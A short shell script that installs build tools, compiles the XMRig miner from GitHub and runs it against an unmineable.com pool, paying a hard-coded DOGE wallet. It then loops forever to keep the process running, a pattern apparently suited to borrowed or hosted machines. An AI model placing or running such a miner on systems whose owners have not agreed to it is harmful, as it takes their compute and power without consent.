#!/bin/sh
sudo apt-get update
sudo apt-get upgrade
apt install -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev
apt install git build-essential cmake libuv1-dev libssl-dev libmicrohttpd-dev gcc-7 g++-7 libhwloc-dev
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build
cd build
cmake ..
make
./xmrig --donate-level 5 -o rx.unmineable.com:3333 -u DOGE:DTyWhFote27EmBJ3rdMetbiGwGSjwQxm94.oonkfr -p x -k -a rx/0
while [ 1 ]; do
sleep 3
done
sleep 999
